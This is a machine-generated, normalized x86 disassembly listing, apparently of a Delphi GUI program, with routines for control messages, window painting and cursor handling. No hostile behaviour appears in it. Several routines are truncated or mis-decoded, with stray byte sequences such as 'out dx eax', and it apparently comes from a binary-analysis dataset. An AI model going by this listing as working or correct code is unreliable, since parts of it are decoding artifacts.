sub_446074
retn
sub_446078
mov eax [ rw-data ]
retn
sub_446080
retn
sub_4460ae
jmp sub_403758
sub_4460b3
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468614
call sub_403ac0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4460d0
call sub_4034d0
xor eax eax
mov [ rw-data ] eax
retn
sub_4460e0
call sub_4034cc
xor eax eax
mov [ rw-data ] eax
retn
sub_4460f0
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_4461a0
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_4461b8
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_446204
retn
sub_4463bc
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_40348c
pop esi
retn
sub_4463d0
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_40348c
pop esi
retn
sub_4463e4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4463f0
mov eax 0x4
retn
sub_4463f8
retn
j_sub_403758#9
jmp sub_403758
sub_4472d6
jmp sub_403a0c
sub_447348
jmp sub_403a0c
sub_447354
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_44707c
sub_4474d3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4247ac
retn
sub_4474e9
jmp sub_403a0c
sub_447510
jmp sub_403a0c
sub_447592
jmp sub_403a0c
sub_4475ba
jmp sub_403a0c
sub_4475c1
mov esp ebp
pop ebp
retn
sub_447679
jmp sub_403a0c
sub_4476d0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44769c
mov [ ebx + 0x58 ] esi
sub_447824
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_447838
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_447921
jmp sub_403a0c
sub_447928
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4479ab
jmp sub_403a0c
sub_4479b2
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_447d80
xor eax eax
retn
sub_447d84
mov al [ eax + 0x58 ]
retn
sub_447d88
xor eax eax
retn
sub_447d8c
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_447d94
mov eax [ eax + 0x30 ]
retn
sub_447e38
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_447ee4
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_447efc
mov [ eax + 0x5d ] dl
retn
sub_447f00
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_44bae0
sub_447f10
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_4483f3
jmp sub_403a0c
sub_4483fa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44845c
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_4484e0
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_4485fd
jmp sub_403a0c
sub_448604
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448700
push eax
xor ecx ecx
mov edx 0xb037
call sub_449ca8
retn
sub_4488c1
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_40348c
sub_448972
jmp sub_403a0c
sub_448979
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_448a50
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_449ca8
sub_448a68
push 0x0
xor ecx ecx
mov edx 0xe
call sub_449ca8
retn
sub_448a78
push edx
mov edx 0xd
call sub_449ca8
retn
sub_448a84
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_448a98
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_448b79
jmp sub_403a0c
sub_448b80
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448b88
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_449ca8
sub_448bf8
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_448c0c
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_448c18
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_448c20
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_449ca8
sub_448c44
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_449ca8
sub_448c68
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_449ca8
sub_448cb0
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_448cb8
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_449ca8
sub_448cdc
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_449ca8
sub_448d00
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_449ca8
sub_448d1c
push ebx
mov ebx eax
call sub_445c9c
cmp ebx eax
sete al
pop ebx
retn
sub_448d54
push esi
mov dl 0x1
mov si 0xffce
call sub_40348c
pop esi
retn
sub_448e9e
jmp sub_403a0c
sub_448ea5
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448fc8
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_448f3c
retn
sub_44901c
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_449030
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_449115
jmp sub_403a0c
sub_449134
xor eax eax
retn
sub_449138
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_449150
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_449168
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_449184
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_44919c
retn
sub_449260
retn
sub_449264
cmp eax [ rw-data ]
sete al
retn
sub_4492d8
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_4493f4
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_40348c
pop esi
pop ebp
retn 0x4
sub_449434
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_4496cb
jmp sub_403a0c
sub_4496d2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4496dc
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_40348c
pop esi
retn
sub_4496f0
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_40348c
pop esi
retn
sub_4499bf
jmp sub_403a0c
sub_449a68
push esi
mov si 0xffee
call sub_40348c
pop esi
retn
sub_449a74
mov al 0x1
retn
sub_449d4c
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_448148
retn
sub_449d70
retn
sub_449f89
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41bedc
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_449fa4
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41e394
retn
sub_44a09c
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_44a6b4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44a6bc
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44a6c4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44a77c
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44a79c
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_448c44
mov [ ebx + 0x9a ] 0x1
sub_44a7f4
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_448be8
mov [ ebx + 0x56 ] 0x1
sub_44a818
mov [ edx + 0xc ] 0x1
retn
sub_44a820
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_449ca8
sub_44a838
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_449ca8
sub_44a850
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_44aab6
jmp sub_403a0c
sub_44aabd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44aae8
mov eax [ r-xdata ]
retn
sub_44ac84
jmp sub_403a0c
sub_44ac8b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44adac
mov eax [ eax + 0xb8 ]
retn
sub_44ae14
push ebx
mov ebx eax
mov eax ebx
call sub_449138
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_44ae30
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44afc8
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44aff8
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_44b000
call sub_447bb4
retn
sub_44b100
jmp sub_403a0c
sub_44b2c0
jmp sub_403a0c
sub_44b310
jmp sub_403a0c
sub_44b348
retn
sub_44b5d1
jmp sub_403a0c
sub_44b759
jmp sub_403a0c
sub_44babb
jmp sub_403a0c
sub_44bb67
jmp sub_403a0c
sub_44bb74
inc [ eax + 0x160 ]
retn
sub_44bb7c
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_44bb9c
sub_44bb9c
xor edx edx
call sub_44bae0
retn
sub_44bc69
jmp sub_403a0c
sub_44bc70
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44bd5f
jmp sub_403a0c
sub_44c286
jmp sub_403a0c
sub_44c28d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c455
jmp sub_403a0c
sub_44c45c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c530
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_44c71d
jmp sub_403a0c
sub_44c724
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_44c814
xor eax eax
retn
sub_44c87c
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_449ca8
j_sub_403758#8
jmp sub_403758
sub_44cadf
jmp sub_403a0c
sub_44cae6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403758#7
jmp sub_403758
sub_44caf5
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468614
call sub_403ac0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d0b0
jmp sub_403a0c
sub_44d0b7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d0c0
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_44d5be
jmp sub_403a0c
sub_44d610
push ebx
mov ebx eax
call sub_422df4
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_449ca8
pop ebx
retn
sub_44d62c
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_449ca8
retn
sub_44d640
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_449ca8
retn
sub_44d650
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_449ca8
retn
sub_44d8fc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44f5ec
pop esi
retn
sub_44da10
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44da60
pop esi
retn
sub_44da24
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44db4c
pop esi
retn
sub_44da38
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44da4c
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44db3f
jmp sub_403a0c
sub_44db46
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44dbd6
jmp sub_403a0c
sub_44dbdd
pop ebx
pop ecx
pop ebp
retn
sub_44dbe4
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_44dbf4
retn
sub_44dbf8
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_44dc18
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_44dd78
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_44de48
retn
sub_44df60
jmp sub_403a0c
sub_44df67
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e032
jmp sub_403a0c
sub_44e05c
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_44e0ee
jmp sub_403a0c
sub_44e2c0
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_44e564
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_44e640
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_44c06c
pop esi
retn
sub_44e704
push esi
mov si 0xffc1
call sub_40348c
pop esi
retn
sub_44e730
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44e744
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44e758
call sub_44c02c
retn
sub_44e760
call sub_44c02c
retn
sub_44e768
call sub_44c02c
retn
sub_44e810
push ebx
mov ebx eax
mov eax ebx
call sub_44a6c4
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_423fb4
mov dx 0xb009
mov eax ebx
call sub_44c06c
pop ebx
retn
sub_44e974
call sub_44c02c
retn
sub_44e97c
call sub_44c02c
retn
sub_44e984
call sub_44c02c
retn
sub_44e98c
call sub_44c02c
retn
sub_44e9f0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44ee86
jmp sub_403a0c
sub_44ee8d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ef6c
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_44f110
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_449ca8
retn
sub_44f1b0
push ebx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_44f1cc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_44f3a4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_44f2dc
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_44f3fc
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_449ca8
sub_44f41c
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_449ca8
sub_44f440
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_44f44c
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_449ca8
sub_44f4f8
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_44f49c
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_44f5d4
jmp sub_403a0c
sub_44f5db
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f7fa
jmp sub_403a0c
sub_44f801
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44f908
call sub_449a78
retn
sub_44fd56
jmp sub_403a0c
sub_44fdec
mov eax [ r-xdata ]
retn
sub_44ff53
jmp sub_403a0c
sub_450064
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_449ca8
sub_450084
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_449ca8
sub_45039a
jmp sub_403a0c
sub_4504dc
test [ eax + 0x52 ] 0x4
setne al
retn
sub_450638
jmp sub_403a0c
sub_45063f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4247ac
retn
sub_45065b
jmp sub_403a0c
sub_450668
retn
sub_45073c
mov [ edx + 0xc ] 0xffffffff
retn
sub_45079a
jmp sub_403a0c
sub_4507a1
pop ecx
pop ecx
pop ebp
retn
sub_450841
jmp sub_403a0c
sub_450848
pop ebx
mov esp ebp
pop ebp
retn
sub_4508b4
call sub_44c834
retn
sub_450947
jmp sub_403a0c
sub_45094e
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_450b2d
jmp sub_403a0c
sub_450b34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450d50
jmp sub_403a0c
sub_450da4
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_450c90
sub_450ee8
push ebx
mov ebx eax
mov eax ebx
call sub_455bf0
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_450f00
push ebx
mov ebx eax
mov eax ebx
call sub_455bf0
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_450fec
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_44d46c
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_451087
jmp sub_403a0c
sub_45108e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4510b1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4247ac
retn
sub_4510aa
jmp sub_403a0c
sub_4510b1
pop ebx
pop ecx
pop ebp
retn
sub_4510b8
retn
sub_451120
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_45148d
jmp sub_403a0c
sub_451674
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_451860
jmp sub_403a0c
sub_451910
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_451924
inc [ eax + 0x6c ]
retn
sub_451928
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_4531a8
sub_451a88
call sub_452188
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_452433
jmp sub_403a0c
sub_45243a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452457
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_452450
jmp sub_403a0c
sub_452457
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452738
jmp sub_403a0c
sub_45273f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45275c
mov eax [ ebp - 0x4 ]
call sub_4247ac
retn
sub_452755
jmp sub_403a0c
sub_45275c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452779
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_452772
jmp sub_403a0c
sub_452779
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452c2d
jmp sub_403a0c
sub_452c34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452dbf
jmp sub_403a0c
sub_452dc6
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_452e7b
jmp sub_403a0c
sub_452e82
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_452f70
jmp sub_403a0c
sub_452fc1
jmp sub_403a0c
sub_452fc8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453084
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451994
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_4531d0
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_4514d0
sub_453ad0
jmp sub_403a0c
sub_453ad7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453ba0
call GetCapture
retn
sub_453ba8
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40cbb0
pop ebx
retn
sub_453bb8
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_453e1e
jmp sub_403a0c
sub_454018
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_45422c
jmp sub_403a0c
sub_454233
pop ebx
mov esp ebp
pop ebp
retn
sub_45427e
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_4542fb
jmp sub_403a0c
sub_454302
pop ebp
retn
sub_45438a
jmp sub_403a0c
sub_454391
pop ebp
retn
sub_45499a
out dx eax
jmp [ edi + edx * 2 + 0x45 ]
sub_454ae0
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_41836c
retn
sub_454af8
mov al 0x1
retn
sub_454afc
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_420b44
retn
mov eax edx
retn
sub_454b0c
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_420b14
retn
mov al 0x1
retn
sub_454dfc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418310
pop esi
pop ebx
retn
sub_454e10
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_454e4c
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_4550b0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_4550c4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_4550d8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_4550ec
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_455100
push ebx
